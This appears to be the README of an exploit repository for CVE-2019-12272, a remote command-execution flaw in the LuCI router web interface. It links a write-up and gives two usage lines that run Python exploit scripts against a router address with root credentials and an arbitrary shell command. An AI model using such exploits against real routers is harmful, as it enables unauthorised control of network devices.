# EXP of CVE-2019-12272

* CVE-2019-12272 is a vulnerablity of LuCI to execute arbitrary bash code.

## Details

https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190710-lucirce.html

## Usage

python  .\cve-2019-12272_bandwidth_status.py  -a 192.168.153.4 -u root -p root -c ls    
python  .\cve-2019-12272_wireless_status.py  -a 192.168.153.4 -u root -p root -c ls